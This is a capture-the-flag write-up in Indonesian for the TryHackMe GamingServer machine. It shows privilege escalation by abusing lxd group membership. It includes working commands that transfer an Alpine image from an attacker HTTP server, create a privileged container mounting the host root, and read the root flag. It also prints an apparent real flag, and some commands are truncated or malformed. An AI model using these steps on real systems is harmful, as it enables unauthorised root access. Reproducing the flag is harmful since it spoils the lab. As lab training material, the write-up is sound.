TryHackMe - GamingServer Write-up 🎮
Privilege Escalation via LXD Container 🚀
Repositori ini berisi langkah-langkah teknis untuk melakukan eksploitasi pada mesin GamingServer di TryHackMe, dengan fokus pada tahap Privilege Escalation menggunakan celah keamanan pada grup LXD.
📌 Deskripsi Singkat
GamingServer adalah mesin Linux tingkat easy. Setelah mendapatkan akses awal sebagai user john, kita mengeksploitasi keanggotaan user tersebut dalam grup lxd untuk membuat container istimewa dan melakukan mounting pada sistem file root host.
🛠️ Langkah Eksploitasi
1. Persiapan Image (Attack Machine)
Membuat image Alpine Linux khusus menggunakan lxd-alpine-builder di mesin lokal (Kali Linux):

```bash
wget https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine

```atau```

git https://github.com/saghul/lxd-alpine-builder.git
cd lxd-alpine-builder
sudo ./build-alpine
```

Gunakan kode dengan hati-hati.
2. Transfer File ke Target
Menjalankan server HTTP di Kali Linux dan mengunduh image ke mesin target menggunakan wget:
bash

# Di Kali Linux (IP: 192.168.247.59)
```
python3 -m http.server 80
```

<img width="779" height="349" alt="Screenshot_2026-03-31_06-06-11" src="https://github.com/user-attachments/assets/3ce097ec-2100-4be7-bb9f-8f010b8df81e" />

# Di GamingServer (user john)
```
wget http://192.168.247
```

Gunakan kode dengan hati-hati.
3. Privilege Escalation (LXD Exploit)
Mengimpor image dan membuat container untuk mengakses sistem file root host:
bash

# Impor image
```
lxc image import alpine-v3.13-x86_64-20210218_0139.tar.gz --alias myimage
```

# Inisialisasi container dengan hak akses istimewa
```
lxc init myimage ignite -c security.privileged=true
```

# Mounting direktori root (/) host ke /mnt/root di container
```
lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
```

# Jalankan dan masuk ke container

```
lxc start ignite
lxc exec ignite /bin/sh
```

Gunakan kode dengan hati-hati.
4. Mendapatkan Flag Root
Setelah masuk ke shell container, seluruh file sistem host dapat diakses di /mnt/root:
bash

```cat /mnt/root/root/root.txt```

Gunakan kode dengan hati-hati.
🚩 Flag

    User Flag: [REDACTED]
    Root Flag: 2e337b8c9f3aff0c2b3e8d4e6a7c88fc

    <img width="783" height="497" alt="Screenshot_2026-03-31_06-04-16" src="https://github.com/user-attachments/assets/8ce7bf66-316a-4308-88f8-87d40ad51e6f" />


⚠️ Catatan Keamanan
Informasi dalam draf ini ditujukan untuk keperluan pembelajaran dalam lingkungan laboratorium yang terkendali seperti TryHackMe. Praktik keamanan siber harus selalu dilakukan secara etis dan hanya pada sistem yang telah memberikan izin tertulis untuk pengujian penetrasi.
